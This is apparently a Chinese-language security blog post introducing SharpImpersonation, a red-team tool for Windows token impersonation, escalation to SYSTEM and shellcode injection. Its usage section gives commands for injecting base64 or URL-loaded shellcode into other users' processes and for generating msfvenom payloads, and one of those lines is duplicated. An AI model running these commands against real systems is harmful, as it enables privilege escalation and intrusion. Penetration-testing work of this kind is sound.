![](https://image.3001.net/images/20220921/1663770862_632b20eeab5bc6ddc827c.png!small)  

## 关于SharpImpersonation

SharpImpersonation是一款功能强大的用户模拟工具，该工具基于令牌机制和Shellcode注入技术实现其功能，可以帮助广大研究人员更好地对组织内部的网络环境和系统安全进行分析和测试。

该工具基于[
_Tokenvator_](https://github.com/0xbadjuju/Tokenvator)的代码库实现其功能，并对其部分代码进行了优化，同时还添加了还嗯多其他的功能，并且还参考借鉴了很多其他优秀的开源工具。

## 功能介绍

> 1、使用list参数枚举本地系统中的所有用户；
>
> 2、以非提权上下文枚举本地系统中的所有用户；
>
> 3、自动提权为“SYSTEM”；
>
> 4、搜索目标用户名的第一个进程，将其进程ID作为目标；
>
> 5、支持从Webserver加载Stager；
>
> 6、......

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/S3cur3Th1sSh1t/SharpImpersonation.git

## 工具使用

### 枚举用户进程

    
    
    PS > PS C:\temp> SharpImpersonation.exe list

![](https://image.3001.net/images/20220921/1663770898_632b2112bcba311e14374.png!small)

### 枚举提权进程

    
    
    PS > PS C:\temp> SharpImpersonation.exe list elevated

### 模拟目标用户的第一个进程并执行新的代码

    
    
    PS > PS C:\temp> SharpImpersonation.exe user:<user> binary:<binary-Path>

![](https://image.3001.net/images/20220921/1663770906_632b211a363e4084f8c62.png!small)

### 向目标用户的第一个进程注入Base64编码的Shellcode

    
    
    PS > PS C:\temp> SharpImpersonation.exe user:<user> shellcode:<base64shellcode>

![](https://image.3001.net/images/20220921/1663770916_632b2124cbe89a2f9ede0.png!small)

### 从Webserver载入Shellcode并注入到目标用户的第一个进程

    
    
    PS > PS C:\temp> SharpImpersonation.exe user:<user> shellcode:<URL>

![](https://image.3001.net/images/20220921/1663770923_632b212b52c044cd85dee.png!small)

### 通过ImpersonateLoggedOnuser模拟当前会话的目标用户

    
    
    PS > PS C:\temp> SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser

![](https://image.3001.net/images/20220921/1663770930_632b213201f215c83bb12.png!small)

### 生成msfvenom Shellcode并注入到其他用户进程中

    
    
    msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=threadmsfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread | base64 -w0

![](https://image.3001.net/images/20220921/1663770939_632b213b10c5dd8744caa.png!small)  

## 项目地址

 **SharpImpersonation** ：【[
_GitHub传送门_](https://github.com/S3cur3Th1sSh1t/SharpImpersonation)】

## 参考资料

> [
> _https://github.com/0xbadjuju/Tokenvator_](https://github.com/0xbadjuju/Tokenvator)
>
> [ _https://s3cur3th1ssh1t.github.io/SharpImpersonation-> Introduction/_](https://s3cur3th1ssh1t.github.io/SharpImpersonation-> Introduction/)
>
> [ _https://lolbas-project.github.io/_](https://lolbas-project.github.io/)
>
> [ _https://thewover.github.io/Dynamic-> Invoke/_](https://thewover.github.io/Dynamic-Invoke/)
>
> [
> _https://github.com/TheWover/DInvoke_](https://github.com/TheWover/DInvoke)
>
> [
> _https://github.com/djhohnstein/SharpChromium_](https://github.com/djhohnstein/SharpChromium)
>
> [
> _https://github.com/V1V1/SharpScribbles/tree/master/ThunderFox_](https://github.com/V1V1/SharpScribbles/tree/master/ThunderFox)
>
> [ _https://s3cur3th1ssh1t.github.io/On-how-to-access-protected-> networks/_](https://s3cur3th1ssh1t.github.io/On-how-to-access-protected-> networks/)
>
> [
> _https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH_](https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH)
>
> [ _https://www.mcafee.com/enterprise/en-us/assets/reports/rp-access-token-> theft-manipulation-attacks.pdf_](https://www.mcafee.com/enterprise/en-> us/assets/reports/rp-access-token-theft-manipulation-attacks.pdf)

